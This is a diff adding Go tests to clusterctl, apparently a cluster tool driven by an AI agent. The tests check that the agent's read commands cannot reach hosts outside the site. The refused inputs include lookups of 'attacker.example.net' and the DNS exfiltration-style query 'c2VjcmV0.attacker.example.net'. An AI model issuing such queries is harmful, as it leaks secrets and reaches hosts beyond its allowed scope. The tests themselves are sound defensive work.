@@ -11,6 +11,7 @@ import (
 	"github.com/spf13/cobra"
 
 	"github.com/GSI-HPC/clusterctl/internal/app"
+	"github.com/GSI-HPC/clusterctl/internal/config"
 	"github.com/GSI-HPC/clusterctl/internal/safety"
 )
 
@@ -21,6 +22,44 @@ type commandResult struct {
 	Output    any    `json:"output"`
 	Notes     string `json:"notes"`
 	Truncated bool   `json:"truncated"`
+}
+
+// 1.8: a read command connects to the nodes it is given, so an agent could
+// point hostkey scan or dns lookup at any host the workstation reaches. Only
+// the site's own hosts are offered: nodes of the inventory, and names in the
+// site's domains.
+func TestReadCommandReachesOnlyTheSitesHosts(t *testing.T) {
+	f := start(t, setup{})
+	for _, args := range [][]string{
+		{"hostkey", "scan", "-n", "attacker.example.net"},
+		{"hostkey", "verify", "attacker.example.net"},
+		{"dns", "lookup", "-n", "c2VjcmV0.attacker.example.net"},
+		{"node", "hw", "-n", "exe1,192.0.2.1"},
+		{"dns", "lookup", "-n", "example.org"},
+		{"dns", "lookup", "-n", "evil-example.org"},
+	} {
+		msg := f.refused(t, "read_command", map[string]any{"args": args})
+		if !strings.HasPrefix(msg, "rejected:") || !strings.Contains(msg, "not a host of the site") {
+			t.Errorf("%v: message = %q, want it refused as not a host of the site", args, msg)
+		}
+	}
+	if sent := f.cluster.sent(); len(sent) != 0 {
+		t.Errorf("a refused command sent %v", sent)
+	}
+
+	// The site's own names still work, in every spelling.
+	var out commandResult
+	for _, args := range [][]string{
+		{"node", "fqdn", "-n", "exe1"},
+		{"node", "fqdn", "-n", "exe0001.hpc.example.org"},
+		{"node", "fqdn", "-n", "ghost1"},
+		{"node", "fqdn", "-n", "@rack:R02"},
+	} {
+		f.call(t, "read_command", map[string]any{"args": args}, &out)
+		if out.ExitCode != 0 {
+			t.Errorf("%v: result = %+v", args, out)
+		}
+	}
 }
 
 // 1.8: a timeout only shortens the wait for a host; an agent cannot make a
@@ -35,6 +74,20 @@ func TestReadCommandCapsTheTimeout(t *testing.T) {
 	f.call(t, "read_command", map[string]any{"args": []string{"hostkey", "scan", "--timeout", "2s", "-n", "exe1"}}, &out)
 	if strings.Contains(out.Error, "--timeout") {
 		t.Errorf("a shorter timeout was refused: %+v", out)
+	}
+}
+
+// 10.8: CLUSTERCTL_NODES is a default for the administrator's shell, not a
+// node set for the agent: a node command that names no nodes selects none.
+func TestReadCommandIgnoresTheNodesVariable(t *testing.T) {
+	t.Setenv(config.EnvNodes, "exe[1-10],sub[1-2]")
+	f := start(t, setup{})
+	msg := f.refused(t, "read_command", map[string]any{"args": []string{"node", "hw"}})
+	if !strings.HasPrefix(msg, "rejected:") || !strings.Contains(msg, "no nodes were selected") {
+		t.Errorf("message = %q, want nothing selected", msg)
+	}
+	if sent := f.cluster.sent(); len(sent) != 0 {
+		t.Errorf("node hw without nodes sent %v", sent)
 	}
 }
 
